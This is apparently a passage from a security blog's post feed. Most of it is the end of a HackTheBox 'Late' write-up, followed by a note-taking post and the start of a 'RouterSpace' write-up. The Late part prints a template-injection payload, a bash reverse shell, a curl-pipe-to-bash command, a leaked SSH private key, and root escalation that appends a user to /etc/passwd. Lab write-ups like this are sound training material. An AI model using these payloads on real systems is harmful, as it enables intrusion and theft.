Server response: &lt;p&gt;(b'main.py\\nmisc\\n__pycache__\\nstatic\\ntemplates\\nuploads\\nwsgi.py\\n', None) &lt;/p&gt;  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ python3 sendImg.py 'http://images.late.htb/scanner' '\"foo\".__class__.__base__.__subclasses__()[249](\"id\",shell=True,stdout=-1).communicate()' Generating the payload... Uploading file to http://images.late.htb/scanner  Server response: &lt;p&gt;(b'uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\\n', None) &lt;/p&gt;   Reverse shell:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late] ‚îî‚îÄ$ echo \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/10099 0&gt;&amp;1'\" &gt; rev.sh  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80                                                                              1 ‚öô Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.156 - - [10/May/2022 18:23:10] \"GET /rev.sh HTTP/1.1\" 200 -   ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ python3 sendImg.py 'http://images.late.htb/scanner' '\"foo\".__class__.__base__.__subclasses__()[249](\"curl 10.10.14.2/rev.sh|/bin/bash\",shell=True,stdout=-1).communicate()' Generating the payload... Uploading file to http://images.late.htb/scanner  Server response:  &lt;html&gt; &lt;head&gt;&lt;title&gt;502 Bad Gateway&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor=\"white\"&gt; &lt;center&gt;&lt;h1&gt;502 Bad Gateway&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt; &lt;/body&gt; &lt;/html&gt;   ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.156] 36730 bash: cannot set terminal process group (1243): Inappropriate ioctl for device bash: no job control in this shell bash-4.4$ id; hostname; cat ~/user.txt id; hostname; cat ~/user.txt uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) late 17014663f79056cca573134662ef1a25   Vulnerable code  main.py  import datetime import os, random from flask.templating import render_template_string from werkzeug.utils import secure_filename import PIL.Image import pytesseract from PIL import Image from flask import Flask, request, render_template, redirect, url_for, session, send_file  app = Flask(__name__)  upload_dir = \"/home/svc_acc/app/uploads\" misc_dir = '/home/svc_acc/app/misc' allowed_extensions =  [\"jpg\" ,'png'] app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/'  @app.route('/') def home():     return render_template(\"index.html\", title=\"Image Reader\")  @app.route('/scanner', methods=['GET', 'POST']) def scan_file():     scanned_text = ''     results = ''     if request.method == 'POST':         start_time = datetime.datetime.now()         f = request.files['file']          if f.filename.split('.')[-1] in allowed_extensions:             try:                 ID = str(random.randint(1,10000))                 file_name = upload_dir + \"/\" + secure_filename(f.filename )+ ID                 f.save(file_name)                 pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'                 scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))                  results = \"\"\"&lt;p&gt;{}&lt;/p&gt;\"\"\".format(scanned_text)                  r = render_template_string(results)                 path = misc_dir + \"/\" + ID + '_' + 'results.txt'                  with open(path, 'w') as f:                     f.write(r)                  return send_file(path, as_attachment=True,attachment_filename='results.txt')              except Exception as e:                 return ('Error occured while processing the image: ' + str(e))         else:             return 'Invalid Extension'   Privilege Escalation  Local enumeration          Enumerated local users:        bash-4.4$ cat /etc/passwd | grep sh   root:x:0:0:root:/root:/bin/bash   sshd:x:110:65534::/run/sshd:/usr/sbin/nologin   svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash                Leaked svc_acc ssh private key:        svc_acc@late:~$ cat ~/.ssh/   authorized_keys  id_rsa           id_rsa.pub   svc_acc@late:~$ cat ~/.ssh/id_rsa   -----BEGIN RSA PRIVATE KEY-----   MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM   HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO   bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi   /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7   d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7   7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM   fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0   ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz   W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ   uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC   T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH   Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi   WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng   Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7   t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq   0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE   uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y   3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ   GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F   ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb   Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr   kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+   Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL   K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0   kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==   -----END RSA PRIVATE KEY-----                Enumerated possible exploit with linpeas:        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executing Linux Exploit Suggester                                                                                                                                                                                                 ‚ïö https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                             [+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                                                                                                                                                                                                                                                                         Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                                                                                                                                                                            Exposure: probable                                                                                                                                                                                                                             Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro                                                                                                                                                         Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                                                                                                                                                                                                                                                                                                                                                                                                                      [+] [CVE-2021-3156] sudo Baron Samedit                                                                                                                                                                                                                                                                                                                                                                                                                                                             Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                            Exposure: probable                                                                                                                                                                                                                             Tags: mint=19,[ ubuntu=18|20 ], debian=10                                                                                                                                                                                                      Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main                                                                                                                                                                                                                                                                                                                                                                                                                      [+] [CVE-2021-3156] sudo Baron Samedit 2                                                                                                                                                                                                                                                                                                                                                                                                                                                           Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                            Exposure: probable                                                                                                                                                                                                                             Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10                                                                                                                                                                                   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main                                                                                                                                                                                                                                                                                                                                                                                                                     [+] [CVE-2018-18955] subuid_shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712                                                                                                                                                                        Exposure: probable                                                                                                                                                                                                                             Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}                                                                                                                                                             Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip                                                                                                                                     Comments: CONFIG_USER_NS needs to be enabled                                                                                                                                                                                                                                                                                                                           [+] [CVE-2021-22555] Netfilter heap out-of-bounds write                                                                                                                                                                                                Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html                                                                                                                                                     Exposure: less probable                                                                                                                                                                                                                        Tags: ubuntu=20.04{kernel:5.8.0-*}                                                                                                                                                                                                             Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c                                                                                                                            ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c                                                                                                                                              Comments: ip_tables kernel module must be loaded                                                                                                                                                                                                                                                                                                                                                                                                                                             [+] [CVE-2019-18634] sudo pwfeedback                                                                                                                                                                                                                                                                                                                                         Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/                                                               Exposure: less probable                                                                                                  Tags: mint=19                                                                                                                                                                                                                                  Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c                                                                                                                                                         Comments: sudo configuration requires pwfeedback to be enabled.                                                                                                                                                                                                                                                                                                                                                                                                                              [+] [CVE-2019-15666] XFRM_UAF                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc                                                                                                                                                                                 Exposure: less probable                                                                                                                                                                                                                        Download URL:       Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled        [+] [CVE-2017-5618] setuid screen v4.5.0 LPE        \t Details: https://seclists.org/oss-sec/2017/q1/184      Exposure: less probable      Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154        [+] [CVE-2017-0358] ntfs-3g-modprobe           Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072      Exposure: less probable      Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}      Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip      Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.                Enumerated active ports:        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Active Ports                                                                                                                                                                                                                      ‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                                  tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                                                                                                              tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                              tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                              tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                                                                                                                                                              tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1231/python3                                                                                                                                                   tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                                                                                                                                                              tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                                                                                              tcp6       0      0 :::22                   :::*                    LISTEN      -           Relative Path Hijacking / Writable path abuse  Enumerated PATH with linpeas:  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ PATH ‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin   Enumerated uncommon files:  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ .sh files in  and directories ‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path You own the script: /usr/local/sbin/ssh-alert.sh /usr/bin/gettext.sh  svc_acc@late:/usr/local$ ls -ald sbin drwxr-xr-x 2 svc_acc svc_acc 4096 May 10 19:58 sbin  svc_acc@late:/usr/local$ ls -al sbin/ total 12 drwxr-xr-x  2 svc_acc svc_acc 4096 May 10 19:59 . drwxr-xr-x 10 root    root    4096 Aug  6  2020 .. -rwxr-xr-x  1 svc_acc svc_acc  433 May 10 19:59 ssh-alert.sh  svc_acc@late:/usr/local$ cat sbin/ssh-alert.sh #!/bin/bash  RECIPIENT=\"root@late.htb\" SUBJECT=\"Email from Server Login: SSH Alert\"  BODY=\" A SSH login was detected.          User:        $PAM_USER         User IP Host: $PAM_RHOST         Service:     $PAM_SERVICE         TTY:         $PAM_TTY         Date:        `date`         Server:      `uname -a` \"  if [ ${PAM_TYPE} = \"open_session\" ]; then         echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT} fi  svc_acc@late:/usr/local$ grep -ri ssh-alert /etc/ 2&gt;/dev/null /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh svc_acc@late:/usr/local$ cat /etc/pam.d/sshd | grep -v '#' |grep . @include common-auth account    required     pam_nologin.so @include common-account session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close session    required     pam_loginuid.so session    optional     pam_keyinit.so force revoke @include common-session session    optional     pam_motd.so noupdate session    required     pam_limits.so session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open @include common-password session required pam_exec.so /usr/local/sbin/ssh-alert.sh   Tried to update the script but it did not work:  svc_acc@late:/usr/local/sbin$ echo 'echo $(id) &gt; /tmp/id' &gt; ssh-alert.sh  -bash: ssh-alert.sh: Operation not permitted   Exploited relative path hijacking in Date: `date`:  svc_acc@late:/usr/local/sbin$ echo 'echo $(id) &gt; /dev/shm/id.txt' &gt; date svc_acc@late:~$ exit logout Connection to late.htb closed.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Late/loot] ‚îî‚îÄ$ ssh -i svc_acc.key svc_acc@late.htb svc_acc@late:/usr/local/sbin$ cat /dev/shm/id.txt uid=0(root) gid=0(root) groups=0(root)   Injected a root user and logged in as root:  svc_acc@late:/usr/local/sbin$ openssl passwd evil\t\t AK24fcSx2Il3I  svc_acc@late:/usr/local/sbin$ echo 'echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd' &gt; date  svc_acc@late:~$ exit logout Connection to late.htb closed.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Late/loot] ‚îî‚îÄ$ ssh -i svc_acc.key svc_acc@late.htb svc_acc@late:/usr/local/sbin$ su root2 Password: root@late:/usr/local/sbin## id; hostname; ifconfig; cat /root/root.txt uid=0(root) gid=0(root) groups=0(root) late eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.11.156  netmask 255.255.254.0  broadcast 10.10.11.255         inet6 dead:beef::250:56ff:feb9:3340  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:3340  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 00:50:56:b9:33:40  txqueuelen 1000  (Ethernet)         RX packets 7477  bytes 2958498 (2.9 MB)         RX errors 0  dropped 35  overruns 0  frame 0         TX packets 5403  bytes 814488 (814.4 KB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 8013  bytes 2196360 (2.1 MB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 8013  bytes 2196360 (2.1 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  8c0052eaaca4ce0e103928cb82e7e550     Trophy    User.txt  17014663f79056cca573134662ef1a25  Root.txt  8c0052eaaca4ce0e103928cb82e7e550"
  },
  
  {
    "title": "Taking effective notes for CTF, OSCP and other labs",
    "url": "/posts/taking-effective-notes-for-oscp/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "OSCP, obsidian, note-taking, notion",
    "date": "2022-07-11 00:00:00 +0200",
    "content": "Introduction  Go to the 2025 version of this article! Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)  Having excellent and well-organized notes is a lifesaver during the Offensive Security‚Äôs OSCP preparation and exam, but also during CTFs, allowing you to identify vulnerabilities already exploited in the past and also to map how machines are interconnected with each other within the network.  In this video, I will show you how I take practical notes using Obsidian and Notion and how I organize them.  Video   References  Download the templates mentioned inside the video from the following links:    Notion template   Obsidian template"
  },
  
  {
    "title": "HackTheBox - RouterSpace",
    "url": "/posts/routerspace/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2022-07-09 00:00:00 +0200",
    "content": "Resolution summary     Web server allows to download an APK   Intercepting the APK‚Äôs HTTP traffic it was possible to find an API vulnerable to code injection   Local enumeration allowed to discover that the machine‚Äôs sudo binary was vulnerable to CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)   Improved skills     Intercepting APK‚Äôs HTTP request and testing API   Finding and exploiting command injection vulnerabilities   Exploiting known vulnerabilities   Used tools     nmap   apktool &amp; bytecode-viewer   genymotion   burpsuite   scp     Information Gathering  Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/RouterSpace] ‚îî‚îÄ$ sudo nmap -p- -v 10.10.11.148 -sT -T4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 14:34 EDT Initiating Ping Scan at 14:34 Scanning 10.10.11.148 [4 ports] ... PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 112.47 seconds            Raw packets sent: 4 (152B) | Rcvd: 1 (28B)   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/RouterSpace] ‚îî‚îÄ$ sudo nmap -sV -sC -p 22,80 -oN scan/open-tcp-ports.txt 10.10.11.148 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 14:36 EDT Nmap scan report for 10.10.11.148 Host is up (0.038s latency).  PORT   STATE SERVICE VERSION 22/tcp open  ssh     (protocol 2.0) | fingerprint-strings: |   NULL: |_    SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: |   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) |   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open  http |_http-trane-info: Problem with XML parsing of /evox/about | fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 200 OK |     X-Powered-By: RouterSpace |     X-Cdn: RouterSpace-93835 |     Content-Type: text/html; charset=utf-8 |     Content-Length: 76 |     ETag: W/\"4c-mbkOKply3sgRHIKxe7Ti+nqgSz8\" |     Date: Sat, 07 May 2022 18:37:03 GMT |     Connection: close |     Suspicious activity detected !!! {RequestID: h5mK W v o EI 3 6F } |   GetRequest: |     HTTP/1.1 200 OK |     X-Powered-By: RouterSpace |     X-Cdn: RouterSpace-34170 |     Accept-Ranges: bytes |     Cache-Control: public, max-age=0 |     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT |     ETag: W/\"652c-17d476c9285\" |     Content-Type: text/html; charset=UTF-8 |     Content-Length: 25900 |     Date: Sat, 07 May 2022 18:37:03 GMT |     Connection: close |     &lt;!doctype html&gt; |     &lt;html class=\"no-js\" lang=\"zxx\"&gt; |     &lt;head&gt; |     &lt;meta charset=\"utf-8\"&gt; |     &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt; |     &lt;title&gt;RouterSpace&lt;/title&gt; |     &lt;meta name=\"description\" content=\"\"&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/magnific-popup.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/themify-icons.css\"&gt; |   HTTPOptions: |     HTTP/1.1 200 OK |     X-Powered-By: RouterSpace |     X-Cdn: RouterSpace-1296 |     Allow: GET,HEAD,POST |     Content-Type: text/html; charset=utf-8 |     Content-Length: 13 |     ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\" |     Date: Sat, 07 May 2022 18:37:03 GMT |     Connection: close |     GET,HEAD,POST |   RTSPRequest, X11Probe: |     HTTP/1.1 400 Bad Request |_    Connection: close |_http-title: RouterSpace 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.92%I=7%D=5/7%Time=6276BC4F%P=x86_64-pc-linux-gnu%r(NULL, SF:29,\"SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.92%I=7%D=5/7%Time=6276BC50%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,312C,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX SF:-Cdn:\\x20RouterSpace-34170\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control: SF:\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x202021 SF:\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\"652c-17d476c9285\\\"\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x2 SF:0Sat,\\x2007\\x20May\\x202022\\x2018:37:03\\x20GMT\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"zxx\\\"&gt;\\n&lt;h SF:ead&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;met SF:a\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20\\x20\\x SF:20\\x20&lt;title&gt;RouterSpace&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"descr SF:iption\\\"\\x20content=\\\"\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x SF:20content=\\\"width=device-width,\\x20initial-scale=1\\\"&gt;\\n\\n\\x20\\x20\\x20\\x SF:20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\"&gt;\\n\\x2 SF:0\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/owl\\.carousel\\.m SF:in\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/m SF:agnific-popup\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20h SF:ref=\\\"css/font-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"sty SF:lesheet\\\"\\x20href=\\\"css/themify-icons\\.css\\\"&gt;\\n\\x20\")%r(HTTPOptions,107 SF:,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20R SF:outerSpace-1296\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/htm SF:l;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\"d-bMedpZYG SF:rVt1nR4x\\+qdNZ2GqyRo\\\"\\r\\nDate:\\x20Sat,\\x2007\\x20May\\x202022\\x2018:37:0 SF:3\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\")%r(RTSPRequest,2 SF:F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\") SF:%r(X11Probe,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20cl SF:ose\\r\\n\\r\\n\")%r(FourOhFourRequest,132,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powe SF:red-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-93835\\r\\nContent-Type:\\ SF:x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2076\\r\\nETag:\\x20W/\\ SF:\"4c-mbkOKply3sgRHIKxe7Ti\\+nqgSz8\\\"\\r\\nDate:\\x20Sat,\\x2007\\x20May\\x20202 SF:2\\x2018:37:03\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20activ SF:ity\\x20detected\\x20!!!\\x20{RequestID:\\x20h5mK\\x20\\x20\\x20\\x20\\x20W\\x20v SF:\\x20o\\x20EI\\x203\\x20\\x206F\\x20}\\n\\n\\n\\n\\n\\n\");  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds   Enumeration  Port 80 - HTTP (RouterSpace)  Enumerated home page:    Downloaded the APK from the site:  http://10.10.11.148/RouterSpace.apk  RouterSpace.apk  Decompiled the APK:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/loot] ‚îî‚îÄ$ apktool d RouterSpace.apk Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.5.0-dirty on RouterSpace.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files...   Analyzed the AndroidManifest.xml searching for android:minSdkVersion:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/loot] ‚îî‚îÄ$ bat AndroidManifest.xml 